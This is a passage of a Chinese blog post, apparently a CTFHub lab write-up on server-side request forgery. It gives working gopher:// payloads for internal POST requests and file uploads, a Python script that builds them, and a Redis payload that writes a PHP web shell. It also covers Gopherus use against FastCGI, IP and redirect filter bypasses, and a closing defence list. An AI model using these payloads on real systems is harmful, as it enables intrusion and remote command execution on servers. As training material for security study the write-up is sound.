+<p><code>URL</code>编码、替换回车换行为<code>%0d%0a</code>，<code>HTTP</code>包最后加<code>%0d%0a</code>代表消息结束</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Da68a3b03e80ce7fef96007dfa01dc077%250D%250A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241922075.png"></p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>思路和上面一样，利用gopher协议。先抓一个上传文件的包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 293</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge-33d0956f0ecb092a.sandbox.ctfhub.com:10800/</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://challenge-33d0956f0ecb092a.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">hello world!</span><br><span class="line">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span><br></pre></td></tr></table></figure>
+
+<p>再改成gopher协议格式</p>
+<p>贴一个别人写的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/265646.html">脚本</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242112284.png"></p>
+<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议 "></a>FastCGI协议 <a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461"></a></h3><p>应用： <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=nginx&spm=1001.2101.3001.7020">nginx</a>可以通过fastcgi来对接php </p>
+<p> PHP-FPM未授权访问漏洞：PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信 </p>
+<p>利用<a target="_blank" rel="noopener" href="https://codechina.csdn.net/mirrors/tarunkant/Gopherus/-/tree/master">Gopherus</a>.工具生成攻击FastCGI的payload </p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242204376.png"></p>
+<p>上传：</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203397.png"></p>
+<p>连接成功：</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203519.png"></p>
+<blockquote>
+<p>因为是get传参，需要再原基础payload基础上在进行url编码</p>
+</blockquote>
+<h3 id="redis协议"><a href="#redis协议" class="headerlink" title="redis协议"></a>redis协议</h3><p> 主要利用redis未授权访问 </p>
+<p>还是利用<a target="_blank" rel="noopener" href="https://codechina.csdn.net/mirrors/tarunkant/Gopherus/-/tree/master">Gopherus</a>工具生成payload,直接打，记得再次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>按理说这样再连接蚁剑可以了，不知道为什么没打通</p>
+<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><ul>
+<li>可以改变ip地址进制</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制整数格式 = 0xC0A80001</span><br><span class="line">十进制整数格式 = 3232235521</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>省略格式</li>
+</ul>
+<p> 例如<code>10.0.0.1</code>可以写成<code>10.1</code> </p>
+<p>IP地址：127.0.0.1可以改写为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制 = 0x7F000001</span><br><span class="line">十进制 = 2130706433</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>十进制依旧可以绕过</p>
+<ul>
+<li>想考的知识点是：</li>
+</ul>
+<p>SSRF中请求可能会跟随302跳转 </p>
+<ul>
+<li>利用方式：</li>
+</ul>
+<p>我生成一个短链接（ <a target="_blank" rel="noopener" href="https://tinyurl.com/vdt6acjr">https://tinyurl.com/vdt6acjr</a> ）进行上传，但内容依然是127.0.0.1&#x2F;flag.php</p>
+<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>十进制依旧依旧可以绕过</p>
+<ul>
+<li>想考的知识点是：</li>
+</ul>
+<p>在 DNS记录的生存时间（TTL） 设置为零的情况下， Web服务器就不会对指定域名解析的IP进行缓存 。</p>
+<ul>
+<li>利用方式：</li>
+</ul>
+<p>攻击者在DNS服务器中，指定了一个域名，它绑定了两个IP，一个是<code>127.0.0.1</code>，另一个是正常的公网IP<code>118.123.100.70</code>。攻击者 多次重复相同的HTTP请求 ，访问到127.0.0.1</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy1.禁止跳转</span><br><span class="line"><span class="number">2</span>.过滤返回信息</span><br><span class="line"><span class="number">3</span>.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:<span class="regexp">//</span>, gopher:<span class="regexp">//</span>, ftp:<span class="regexp">//</span> 等引起的问题</span><br><span class="line"><span class="number">4</span>.设置URL白名单或者限制内网IP（使用<span class="keyword">gethostbyname</span>()判断是否为内网IP）</span><br><span class="line"><span class="number">5</span>.限制请求的端口为http常用的端口，比如 <span class="number">80</span>、<span class="number">443</span>、<span class="number">8080</span>、<span class="number">8090</span></span><br><span class="line"><span class="number">6</span>.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/265646.html">参考链接</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/ssrf-ctfhub/" rel="tag">ssrf-ctfhub</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="ssh-keygen 公钥登录服务器" class="lazyload">
+          
+        
+        <a href="/2024/04/25/Redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            ssh-keygen 公钥登录服务器
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="fastjson反序列化" class="lazyload">
+        
+      
+      <a href="/2024/04/22/1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          fastjson反序列化
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      John Doe
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        23.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:47
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-ctfhub"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfhub"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.7.</span> <span class="toc-text">redis协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-Bypass"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97IP-Bypass"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC-Bypass"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A-Bypass"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "John Doe",
+          title: "ssrf-ctfhub",
+          url: "http://example.com/2024/04/25/ssrf-ctfhub/",
+          excerpt: "",
+          description: "",
+          stripContent: "ssrf-ctfhub什么是 SSRF?攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 …… SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。  正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。  ssrf 漏洞产生原因SSRF",
+          date: "Thu Apr 25 2024 21:18:08 GMT+0800",
+          updated: "Sat Apr 27 2024 04:11:56 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
